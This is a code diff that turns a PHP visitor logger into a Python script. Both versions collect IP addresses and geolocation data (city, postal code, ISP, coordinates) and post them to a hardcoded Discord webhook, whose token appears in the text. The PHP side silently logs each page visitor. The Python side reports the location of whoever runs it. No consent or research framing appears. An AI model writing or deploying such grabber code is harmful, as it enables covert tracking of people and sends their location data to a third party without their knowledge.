@@ -1,27 +1,32 @@
-<?php
-$webhookurl = "https://discordapp.com/api/webhooks/829335196524347412/MPBKK5YgR8iH-DfogFfIzIN4Y60sAtXMvBbcB9p064rXKe2Jyalrl9XV7-9NnjqJ_ofm/github";
+import requests
+import json
+from dhooks import Webhook, Embed
+from datetime import datetime
 
-$ip = $_SERVER['REMOTE_ADDR'];
-$browser = $_SERVER['HTTP_USER_AGENT'];
-$TheirDate = date('d/m/Y');
-$TheirTime = date('G:i:s');
-$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
-$flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
-$data = "**User IP:** $ip\n**Date:** $TheirDate\n**Time:** $TheirTime \n**Location:** $details->city \n**Region:** $details->region\n**Country** $details->country\n**Postal Code:** $details->zip";
+hook = Webhook("https://discord.com/api/webhooks/829335196524347412/MPBKK5YgR8iH-DfogFfIzIN4Y60sAtXMvBbcB9p064rXKe2Jyalrl9XV7-9NnjqJ_ofm")
 
+time = datetime.now().strftime("%H:%M %p")  
+ip = requests.get('https://api.ipify.org/').text
 
-
-
-$json_data = array ('content'=>"$data", 'username'=>"New Visitor From $details->country", 'avatar_url'=> "$flag");
-$make_json = json_encode($json_data);
-$ch = curl_init( $webhookurl );
-
-curl_setopt( $ch, CURLOPT_POST, 1);
-curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
-curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt( $ch, CURLOPT_HEADER, 0);
-curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
-
-$response = curl_exec( $ch );
-
-?>
+r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
+geo = r.json()
+embed = Embed()
+fields = [
+    {'name': 'IP', 'value': geo['query']},
+    {'name': 'ipType', 'value': geo['ipType']},
+    {'name': 'Country', 'value': geo['country']},
+    {'name': 'City', 'value': geo['city']},
+    {'name': 'Continent', 'value': geo['continent']},
+    {'name': 'Country', 'value': geo['country']},
+    {'name': 'IPName', 'value': geo['ipName']},
+    {'name': 'ISP', 'value': geo['isp']},
+    {'name': 'Latitute', 'value': geo['lat']},
+    {'name': 'Longitude', 'value': geo['lon']},
+    {'name': 'Org', 'value': geo['org']},
+    {'name': 'Region', 'value': geo['region']},
+    {'name': 'Status', 'value': geo['status']},
+]
+for field in fields:
+    if field['value']:
+        embed.add_field(name=field['name'], value=field['value'], inline=True)
+hook.send(embed=embed)
